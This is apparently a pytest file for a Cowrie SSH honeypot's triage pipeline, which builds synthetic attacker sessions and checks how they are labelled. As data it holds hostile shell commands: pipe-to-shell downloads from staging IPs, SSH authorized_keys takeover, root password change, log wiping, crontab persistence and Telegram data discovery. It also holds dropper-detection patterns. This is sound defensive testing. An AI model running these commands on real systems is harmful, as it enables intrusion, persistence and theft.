"""Tier 1 triage tests on synthetic data modelled on the first weeks of real traffic.

Everything goes through loader.py (as cron does), so the hook, the schema migration and
triage are tested together. No payload is ever executed: commands are plain strings.
"""
import json
import os
import shutil
import sqlite3
import subprocess
import sys
from datetime import datetime, timezone

import pytest

ROOT = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "src")
sys.path.insert(0, ROOT)
import fingerprint  # noqa: E402
import triage  # noqa: E402

EMPTY = fingerprint.EMPTY_SHA256
DROP_HASH = "6d1fe6ab" + "1" * 56
SSHD_HASH = "6e78b3f8" + "2" * 56
SSHD_HASH2 = "649bdd83" + "3" * 56
KEY = "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2 mdrfckr"
MDRFCKR = [
    "cd ~; chattr -ia .ssh; lockr -ia .ssh",
    f'cd ~ && rm -rf .ssh && mkdir .ssh && echo "{KEY}">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~',
]
MDRFCKR_LONG = MDRFCKR + [
    'echo "root:Xy12abcd"|chpasswd|bash',
    "cat /proc/cpuinfo | grep name | wc -l",
    "free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",
    "ls -lh $(which ls)",
    "crontab -l",
    "w",
    "uname -m",
]

_n = [0]


def ev(session, eventid, ts, ip="203.0.113.7", **kw):
    d = {"session": session, "protocol": "ssh", "src_ip": ip, "src_port": 40000, "dst_ip": "172.30.0.2",
         "dst_port": 2222, "eventid": eventid, "timestamp": ts, "message": "m"}
    d.update(kw)
    return json.dumps(d)


def session(sid, commands=(), uploads=(), tunnels=(), downloads=(), ip="203.0.113.7", closed=True,
            day="2026-11-10"):
    """One Cowrie session as log lines. Sessions get increasing timestamps in creation order."""
    _n[0] += 1
    t = f"{day}T{_n[0] // 3600 % 24:02d}:{_n[0] // 60 % 60:02d}:{_n[0] % 60:02d}"
    lines = [ev(sid, "cowrie.session.connect", t + ".000000Z", ip=ip),
             ev(sid, "cowrie.login.success", t + ".100000Z", ip=ip, username="root", password="x")]
    for i, c in enumerate(commands):
        lines.append(ev(sid, "cowrie.command.input", f"{t}.{200000 + i:06d}Z", ip=ip, input=c))
    for i, (name, sha) in enumerate(uploads):
        lines.append(ev(sid, "cowrie.session.file_upload", f"{t}.{500000 + i:06d}Z", ip=ip,
                        filename=name, shasum=sha, outfile="var/lib/cowrie/downloads/" + sha))
    for i, (url, sha) in enumerate(downloads):
        lines.append(ev(sid, "cowrie.session.file_download", f"{t}.{600000 + i:06d}Z", ip=ip, url=url, shasum=sha))
    for i, (host, port) in enumerate(tunnels):
        lines.append(ev(sid, "cowrie.direct-tcpip.request", f"{t}.{700000 + i:06d}Z", ip=ip,
                        dst_ip=host, dst_port=port))
    if closed:
        lines.append(ev(sid, "cowrie.session.closed", t + ".900000Z", ip=ip, duration_ms=1500))
    return lines


@pytest.fixture
def app(tmp_path):
    d = tmp_path / "app"
    d.mkdir()
    for f in ("loader.py", "schema.sql", "fingerprint.py", "triage.py"):
        shutil.copy(os.path.join(ROOT, f), d / f)
    logs = tmp_path / "logs"
    logs.mkdir()
    return d, logs


def run(app_dir, logs, script="loader.py", *args, extra_env=None):
    env = dict(os.environ, COWRIE_LOG_GLOB=str(logs / "cowrie.json*"), COWRIE_DB=str(app_dir / "data" / "cowrie.db"))
    env.pop("SELF_IPS", None)
    env.update(extra_env or {})
    r = subprocess.run([sys.executable, script, *args], cwd=app_dir, env=env, capture_output=True, text=True)
    assert r.returncode == 0, r.stderr
    return r


def write(path, lines, mode="w"):
    with open(path, mode) as f:
        f.write("\n".join(lines) + "\n")


def verdicts(app_dir):
    db = sqlite3.connect(app_dir / "data" / "cowrie.db")
    rows = db.execute("SELECT session, label, kind, needs_analysis, reasons, analyzed_at FROM triage").fetchall()
    return {r[0]: {"label": r[1], "kind": r[2], "q": r[3], "reasons": json.loads(r[4]), "analyzed_at": r[5]}
            for r in rows}


def realistic_week():
    lines = []
    for i in range(40):                                                    # the loud "ok" prober
        lines += session(f"ok{i}", [r'echo -e "\x6F\x6B"'], ip="198.51.100.61")
    for i, c in enumerate(["uname -a", "hostname", "whoami", "pwd", "ls -la /", "ps aux | head -10",
                           "netstat", "history", "ssh -V", "nproc", "mount", "free -h", "env", "uptime",
                           "df -h", "lspci", "cat /proc/cpuinfo", "echo 'SSH check'", "echo SHELL_TEST",
                           "echo OK", "perl -v", "/ip cloud print"]):
        lines += session(f"rc{i}", [c], ip=f"198.51.100.{i}")
    lines += session("sshole1", ["echo 'SSHOLE_'\"1793993208899\""])
    lines += session("sshole2", ["echo 'SSHOLE_'\"1793993999123\""])
    lines += session("two_recon", ["uname -a", "whoami"])
    lines += session("three_recon", ["uname -a", "whoami", "id"])
    lines += session("three_recon_b", ["uname -a", "whoami", "id"], ip="192.0.2.99")
    lines += session("hostwget", ["hostname; wget http://203.0.113.9/a.sh | sh"])
    for i in range(5):
        lines += session(f"md{i}", MDRFCKR, ip=f"192.0.2.{i}",
                         downloads=[("redir", f"{i:02x}" * 32)])            # authorized_keys redirect
    for i in range(3):
        lines += session(f"mdlong{i}", MDRFCKR_LONG + ["echo extra"] * i, ip=f"192.0.2.{50 + i}")
    for i, name in enumerate(["AbCdEfGh", "QwErTyUi", "ZxCvBnMm"]):
        lines += session(f"drop{i}", [f"scp -t /tmp/{name}", f"cd /tmp && chmod +x {name} && bash -c ./{name}"],
                         uploads=[(name, DROP_HASH)])
    for i in range(3):
        lines += session(f"sshd{i}", uploads=[("sshd", SSHD_HASH)])
    lines += session("sshd_new", uploads=[("sshd", SSHD_HASH2)])
    for i in range(2):
        lines += session(f"empty{i}", uploads=[("sshd", EMPTY)])
    for i in range(5):
        lines += session(f"smtp{i}", tunnels=[("192.0.2.25", 25)])
    for i in range(2):
        lines += session(f"goog{i}", tunnels=[("google.com", 80)])
    lines += session("idle")
    # from the first real --report
    for i, c in enumerate(["netstat -tulpn | head -10", "history | tail -5", "ssh -V 2>&1",
                           "nproc || grep -c processor /proc/cpuinfo", "mount | head -5", "free -h | head -2",
                           "env | head -10", "df -h | head -5", "uptime;uname -a", "ls 2>/dev/null",
                           "lspci | grep -i vga || lspci | grep -i nvidia || echo 'No GPU info'"]):
        lines += session(f"rr{i}", [c], ip="198.51.100.157")
    lines += session("ros", ["/ip cloud print", "/system resource print", "/interface print detail",
                             "/ip address print", "/user print", "/system identity print",
                             "/system routerboard print", "/ip service print", "uname -a"])
    lines += session("ros_evil", ["/ip cloud print", "/user add name=x password=y group=full"])
    lines += session("ros_fetch", ["/ip cloud print", "/tool fetch url=http://203.0.113.5/a.rsc"])
    # mdrfckr redirect captured with a non-'redir' url value: still not a payload
    lines += session("md_odd", MDRFCKR, downloads=[(".ssh/authorized_keys", "a8460f44" + "4" * 56)])
    lines += session("realdl", ["wget http://203.0.113.9/x"], downloads=[("http://203.0.113.9/x", "beef" * 16)])
    return lines


def test_realistic_week(app):
    app_dir, logs = app
    write(logs / "cowrie.json", realistic_week())
    r = run(app_dir, logs)
    assert "triage:" in r.stdout and "FAILED" not in r.stderr
    v = verdicts(app_dir)

    assert all(v[f"ok{i}"]["label"] == "probe_echo_ok" and not v[f"ok{i}"]["q"] for i in range(40))
    for i in range(22):
        assert (v[f"rc{i}"]["label"], v[f"rc{i}"]["kind"], v[f"rc{i}"]["q"]) == ("recon_single", "noise", 0), i
    assert v["sshole1"]["label"] == v["sshole2"]["label"] == "recon_single"
    assert v["two_recon"]["label"] == "recon_single"

    # 3 recon commands is over the limit: unknown, queued once by fingerprint, then only counted
    assert v["three_recon"]["kind"] == "unknown" and v["three_recon"]["reasons"][0].startswith("first_seen_fingerprint:")
    assert v["three_recon_b"]["q"] == 0

    assert v["hostwget"]["label"] == "dropper" and v["hostwget"]["q"] == 1

    for s in [f"md{i}" for i in range(5)] + [f"mdlong{i}" for i in range(3)]:
        assert (v[s]["label"], v[s]["kind"], v[s]["q"]) == ("mdrfckr_ssh_key_injection", "known_campaign", 0), s

    # exact scp playbook = known campaign; a hash we have not seen before is still queued once
    assert all(v[f"drop{i}"]["label"] == "pi_scp_dropper" for i in range(3))
    assert v["drop0"]["reasons"] == ["first_seen_upload:" + DROP_HASH[:16]]
    assert v["drop1"]["q"] == v["drop2"]["q"] == 0

    assert v["sshd0"]["reasons"] == ["first_seen_upload:" + SSHD_HASH[:16]] and v["sshd0"]["label"] == "upload"
    assert v["sshd1"]["q"] == v["sshd2"]["q"] == 0
    assert v["sshd_new"]["q"] == 1
    assert v["empty0"]["label"] == v["empty1"]["label"] == "empty_upload" and not v["empty0"]["q"]

    assert v["smtp0"]["reasons"] == ["first_seen_tunnel:192.0.2.25:25 (smtp)"]
    assert all(v[f"smtp{i}"]["label"] == "spam_relay" for i in range(5))
    assert v["goog0"]["label"] == v["goog1"]["label"] == "proxy_abuse"
    assert [v[f"smtp{i}"]["q"] for i in range(1, 5)] == [0, 0, 0, 0]
    assert v["goog0"]["reasons"] == ["first_seen_tunnel:google.com:80"] and v["goog1"]["q"] == 0
    assert v["idle"]["label"] == "no_activity"
    assert all(v[f"rr{i}"]["label"] == "recon_single" for i in range(11))
    assert (v["ros"]["label"], v["ros"]["kind"], v["ros"]["q"]) == ("routeros_recon", "known_campaign", 0)
    assert v["ros_evil"]["kind"] == "unknown" and v["ros_evil"]["q"] == 1
    assert v["ros_fetch"]["kind"] == "unknown" and v["ros_fetch"]["q"] == 1
    assert v["md_odd"]["kind"] == "known_campaign" and v["md_odd"]["q"] == 0
    assert v["realdl"]["reasons"] == ["dropper", "first_seen_download:" + "beef" * 4]

    db = sqlite3.connect(app_dir / "data" / "cowrie.db")
    seen = dict(db.execute("SELECT key, count FROM seen_keys"))
    assert seen["tunnel:192.0.2.25:25"] == 5 and seen["upload:" + DROP_HASH] == 3
    assert [k for k in seen if k.startswith("download:")] == ["download:" + "beef" * 16]  # redirects ignored
    queued = {s for s, x in v.items() if x["q"]}
    assert queued == {"three_recon", "hostwget", "drop0", "sshd0", "sshd_new", "smtp0", "goog0",
                      "ros_evil", "ros_fetch", "realdl"}


def test_incremental_open_sessions_and_idempotence(app):
    app_dir, logs = app
    today = datetime.now(timezone.utc).strftime("%Y-%m-%d")              # recent, so not "stale"
    write(logs / "cowrie.json", session("a", ["uname -a"], day=today)
          + session("open", ["id", "uname -a", "w"], closed=False, day=today))
    run(app_dir, logs)
    assert set(verdicts(app_dir)) == {"a"}                                  # open session waits
    write(logs / "cowrie.json", [ev("open", "cowrie.session.closed", today + "T23:59:59.000000Z")], mode="a")
    run(app_dir, logs)
    run(app_dir, logs)
    v = verdicts(app_dir)
    assert set(v) == {"a", "open"} and v["open"]["q"] == 1
    db = sqlite3.connect(app_dir / "data" / "cowrie.db")
    assert db.execute("SELECT count FROM seen_keys WHERE key LIKE 'fp:%' AND count > 1").fetchall() == []


def test_stale_unclosed_session_is_triaged(app):
    app_dir, logs = app
    write(logs / "cowrie.json", session("lost", ["uname -a"], closed=False, day="2026-01-01"))
    run(app_dir, logs)
    assert verdicts(app_dir)["lost"]["label"] == "recon_single"


def test_broken_triage_never_breaks_ingestion(app):
    app_dir, logs = app
    (app_dir / "triage.py").write_text("this is not python(\n")
    write(logs / "cowrie.json", session("a", ["uname -a"]))
    r = run(app_dir, logs)                                                  # exit code 0 asserted inside
    assert "triage: FAILED" in r.stderr
    db = sqlite3.connect(app_dir / "data" / "cowrie.db")
    assert db.execute("SELECT COUNT(*) FROM sessions").fetchone()[0] == 1


def test_rebuild_is_stable_and_keeps_analyzed_at(app):
    app_dir, logs = app
    write(logs / "cowrie.json", realistic_week())
    run(app_dir, logs)
    before = verdicts(app_dir)
    db = sqlite3.connect(app_dir / "data" / "cowrie.db")
    db.execute("UPDATE triage SET analyzed_at = '2026-11-11T00:00:00Z' WHERE session = 'drop0'")
    db.commit()
    db.close()
    r = run(app_dir, logs, "triage.py", "--rebuild")
    assert "rebuild:" in r.stdout
    after = verdicts(app_dir)
    assert after["drop0"]["analyzed_at"] == "2026-11-11T00:00:00Z"
    for s in before:
        assert {k: after[s][k] for k in ("label", "kind", "q", "reasons")} == \
               {k: before[s][k] for k in ("label", "kind", "q", "reasons")}, s


def test_existing_db_from_previous_version_is_migrated(app):
    """The live DB was created by the 2026-11-07 schema: no triage tables yet."""
    app_dir, logs = app
    (app_dir / "data").mkdir()
    old_schema = open(os.path.join(ROOT, "schema.sql")).read().split("-- Tier 1 verdict")[0]
    db = sqlite3.connect(app_dir / "data" / "cowrie.db")
    db.executescript(old_schema)
    db.close()
    write(logs / "cowrie.json", session("a", ["uname -a"]))
    run(app_dir, logs)
    assert verdicts(app_dir)["a"]["label"] == "recon_single"


def test_report_runs_and_sanitizes_attacker_text(app):
    app_dir, logs = app
    evil = "uname; echo \x1b]0;pwned\x07 \x1b[2J" + "A" * 300
    write(logs / "cowrie.json", realistic_week() + session("evil", [evil, "id", "w"])
          + session("evtun", tunnels=[("evil\x1b[31m.example", 25)]))
    run(app_dir, logs)
    r = run(app_dir, logs, "triage.py", "--report")
    assert "\x1b" not in r.stdout and "\x07" not in r.stdout
    assert "tier 2 queue:" in r.stdout and "probe_echo_ok" in r.stdout
    assert "192.0.2.25:25" in r.stdout                                    # repeated tunnel is counted


@pytest.mark.parametrize("cmd,hit", [
    ("cd /tmp && chmod +x X && bash -c ./X", True),
    ("scp -t /tmp/AbCdEfGh", True),
    ("wget http://x/y", True),
    ("curl -s http://x | sh", True),
    ("chmod 777 /tmp/a", True),
    ("./a.out", True),
    ("echo aGVsbG8= | base64 -d", True),
    ("chmod -R go= ~/.ssh", False),
    ("ps aux | head -10", False),
    ("uname -a", False),
    ("ls -la ./", False),
])
def test_dropper_re(cmd, hit):
    assert bool(triage.DROPPER_RE.search(cmd)) is hit


def test_number_masking():
    a = fingerprint.normalize("echo 'SSHOLE_'\"1793993208899\"")
    assert a == "echo 'SSHOLE_'\"<NUM>\""
    assert fingerprint.normalize("ps aux | head -10") == "ps aux | head -10"
    assert fingerprint.normalize("nc 10.0.0.1 2222") == "nc <IP> 2222"


def test_performance_13k_sessions(app):
    """Roughly the real first week; must stay quick on a 2 GB VPS."""
    app_dir, logs = app
    lines = []
    for i in range(13000):
        lines += session(f"p{i}", [r'echo -e "\x6F\x6B"'], ip="198.51.100.61")
    write(logs / "cowrie.json", lines)
    t0 = datetime.now(timezone.utc)
    r = run(app_dir, logs)
    assert "13000 sessions triaged" in r.stdout
    assert (datetime.now(timezone.utc) - t0).total_seconds() < 60


# --------------------------------------------------------------------------------------------
# Rules codified from the first real tier 2 run. Synthetic sessions; the hashes are the real IOCs
# because the rules match them exactly.
# --------------------------------------------------------------------------------------------
PI_SHA = next(iter(triage.PI_SCP_SHA256))
GO_SHA = next(iter(triage.GO_SSHD_SHA256))
M = "echo 'SSHOLE_'\"17939932%05d\""
INFOSTEALER = [
    "/ip cloud print", "ifconfig", "uname -a", "cat /proc/cpuinfo",
    "ps | grep '[Mm]iner'", "ps -ef | grep '[Mm]iner'",
    "ls -la ~/.local/share/TelegramDesktop/tdata /home/*/.local/share/TelegramDesktop/tdata 2>/dev/null",
    "ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /usr/bin/qmuxd /dev/modem* 2>&1",
    "locate D877F783D5D3EF8Cs",
]


def codified_week():
    L = []
    pi = ["scp -t /tmp/NeUdHrWl", "cd /tmp && chmod +x NeUdHrWl && bash -c ./NeUdHrWl"]
    L += session("pi0", pi, uploads=[("NeUdHrWl", PI_SHA)], ip="203.0.113.10")
    L += session("pi1", pi, uploads=[("NeUdHrWl", PI_SHA)], ip="203.0.113.11")
    L += session("pi_exec", pi[1:], ip="203.0.113.11")
    L += session("pi_hashonly", uploads=[("x", PI_SHA)], ip="203.0.113.12")
    L += session("pi_newhash", pi, uploads=[("NeUdHrWl", "abcd" * 16)])
    L += session("pi_mismatch", ["scp -t /tmp/AbCdEfGh", "cd /tmp && chmod +x QwErTyUi && bash -c ./QwErTyUi"])
    L += session("pi_extra", pi + ["wget http://203.0.113.9/m -O /tmp/m"])
    for i in range(3):
        L += session(f"go{i}", uploads=[("sshd", GO_SHA)], ip=f"198.51.100.{30 + i}")
    L += session("go_rename", uploads=[("kworker", GO_SHA)])
    L += session("go_cmds", ["uname -a", "./sshd"], uploads=[("sshd", GO_SHA)])
    L += session("sshd_other", uploads=[("sshd", "fc6fa79f" + "5" * 56)])
    L += session("ss_check", [M % 1, M % 2, "echo 'SSHOLE_B_'\"1793993200003\"; id; echo $?; echo 'SSHOLE_E_'\"1793993200004\""])
    L += session("ss_drop0", [M % 5, "curl http://203.0.113.80:800/ol.sh | bash", "echo $?", "echo 'SSHOLE_E_'\"1793993200006\""])
    L += session("ss_drop1", [M % 7, "curl http://203.0.113.80:800/ol.sh | sh"])
    L += session("ss_newhost", [M % 8, "curl http://198.51.100.80:800/ol.sh | sh"])
    L += session("ss_other_path", [M % 9, "curl http://203.0.113.80:800/x.sh | sh"])
    L += session("ss_extra", [M % 10, M % 11, "rm -rf /var/log"])
    L += session("smtp_new", tunnels=[("198.51.100.25", 587)])
    L += session("smtp_mixed", tunnels=[("192.0.2.25", 25), ("192.0.2.80", 8080)])
    L += session("goog_cmd", ["uname -a"], tunnels=[("google.com", 80)])
    for i in range(3):
        L += session(f"info{i}", INFOSTEALER, ip=f"192.0.2.{120 + i}")
    L += session("info_write", INFOSTEALER + ["echo '* * * * * /tmp/x' >> /etc/crontab"])
    L += session("info_drop", INFOSTEALER + ["wget http://203.0.113.9/miner"])
    L += session("info_partial", INFOSTEALER[1:])                         # no RouterOS probe
    return L


def test_codified_campaigns(app):
    app_dir, logs = app
    write(logs / "cowrie.json", codified_week())
    run(app_dir, logs)
    v = verdicts(app_dir)
    lab = lambda s: (v[s]["label"], v[s]["kind"], v[s]["q"])  # noqa: E731

    assert lab("pi0") == ("pi_scp_dropper", "known_campaign", 1)           # first sighting of the hash
    assert v["pi0"]["reasons"] == ["first_seen_upload:" + PI_SHA[:16]]
    assert lab("pi1") == lab("pi_exec") == lab("pi_hashonly") == ("pi_scp_dropper", "known_campaign", 0)
    assert lab("pi_newhash") == ("pi_scp_dropper", "known_campaign", 1)    # new hash still escalates
    assert v["pi_newhash"]["reasons"] == ["first_seen_upload:" + "abcd" * 4]
    assert lab("pi_mismatch")[:2] == lab("pi_extra")[:2] == ("dropper", "unknown")
    assert v["pi_mismatch"]["q"] == v["pi_extra"]["q"] == 1

    assert lab("go0") == ("go_sshd_upload", "known_campaign", 1)
    assert lab("go1") == lab("go2") == ("go_sshd_upload", "known_campaign", 0)
    assert lab("go_rename")[:2] == ("upload", "unknown")
    assert lab("go_cmds") == ("dropper", "unknown", 1)
    assert lab("sshd_other") == ("upload", "unknown", 1)                    # other sshd hashes: not reviewed yet

    assert lab("ss_check") == ("sshole_access_check", "known_campaign", 0)
    assert lab("ss_drop0") == ("sshole_dropper", "known_campaign", 1)
    assert v["ss_drop0"]["reasons"] == ["first_seen_fetch_url:http://203.0.113.80:800/ol.sh"]
    assert lab("ss_drop1") == ("sshole_dropper", "known_campaign", 0)
    assert lab("ss_newhost") == ("sshole_dropper", "known_campaign", 1)    # new staging host
    assert lab("ss_other_path") == ("dropper", "unknown", 1)
    assert lab("ss_extra")[1] == "unknown" and v["ss_extra"]["q"] == 1

    assert lab("smtp_new") == ("spam_relay", "known_campaign", 1)
    assert v["smtp_new"]["reasons"] == ["first_seen_tunnel:198.51.100.25:587 (submission)"]
    assert lab("smtp_mixed")[:2] == ("direct_tcpip", "unknown")
    assert lab("goog_cmd")[1] == "unknown"

    assert all(lab(f"info{i}") == ("infostealer_recon", "known_campaign", 0) for i in range(3))
    assert lab("info_write")[1] == lab("info_partial")[1] == "unknown"
    assert lab("info_drop") == ("dropper", "unknown", 1)


def test_self_test_sessions_are_not_queued_or_counted(app):
    app_dir, logs = app
    (app_dir / "data").mkdir()
    (app_dir / "data" / "self_ips.txt").write_text("# home\n198.51.100.0/28  # dynamic range\nnot-an-ip\n")
    write(logs / "cowrie.json",
          session("me_env", ["uname -a", "wget http://203.0.113.9/a.sh | sh"], ip="192.0.2.200")
          + session("me_file", ["ls", "pwd", "whoami", "cd /home"], uploads=[("x", "beef" * 16)], ip="198.51.100.5")
          + session("other", ["ls", "pwd", "whoami", "cd /home"], ip="198.51.100.77"))
    r = run(app_dir, logs, extra_env={"SELF_IPS": "192.0.2.200, 2001:db8::1"})
    assert "ignoring invalid self IP entry" in r.stderr
    v = verdicts(app_dir)
    assert (v["me_env"]["label"], v["me_env"]["kind"], v["me_env"]["q"]) == ("self_test", "noise", 0)
    assert (v["me_file"]["label"], v["me_file"]["q"]) == ("self_test", 0)
    assert v["other"]["q"] == 1                                            # same commands, not ours: queued
    db = sqlite3.connect(app_dir / "data" / "cowrie.db")
    assert [k for (k,) in db.execute("SELECT key FROM seen_keys")] == ["fp:" + fingerprint.fingerprint(
        ["ls", "pwd", "whoami", "cd /home"])]                              # nothing from our own sessions
    r = run(app_dir, logs, "triage.py", "--report", extra_env={"SELF_IPS": "192.0.2.200"})
    assert "self_test" in r.stdout


def test_load_self_ips(tmp_path):
    f = tmp_path / "self_ips.txt"
    f.write_text("203.0.113.0/24\n\n# comment only\n")
    nets = triage.load_self_ips(str(f), {"SELF_IPS": "192.0.2.1 192.0.2.2,"})
    assert triage.is_self("203.0.113.99", nets) and triage.is_self("192.0.2.2", nets)
    assert not triage.is_self("192.0.2.3", nets) and not triage.is_self("garbage", nets)
    assert triage.load_self_ips(str(tmp_path / "missing"), {}) == []
    assert not triage.is_self("192.0.2.1", [])


def test_report_shows_codified_labels_with_severity(app):
    app_dir, logs = app
    write(logs / "cowrie.json", codified_week())
    run(app_dir, logs)
    out = run(app_dir, logs, "triage.py", "--report").stdout
    for label, sev in [("pi_scp_dropper", "high"), ("go_sshd_upload", "high"), ("sshole_dropper", "medium"),
                       ("infostealer_recon", "medium"), ("spam_relay", "medium"), ("sshole_access_check", "low")]:
        assert any(label in line and sev in line for line in out.splitlines()), label


def test_rebuild_with_codified_rules_is_stable(app):
    app_dir, logs = app
    write(logs / "cowrie.json", realistic_week() + codified_week())
    run(app_dir, logs)
    before = verdicts(app_dir)
    run(app_dir, logs, "triage.py", "--rebuild")
    after = verdicts(app_dir)
    assert {s: (x["label"], x["q"], x["reasons"]) for s, x in before.items()} == \
           {s: (x["label"], x["q"], x["reasons"]) for s, x in after.items()}
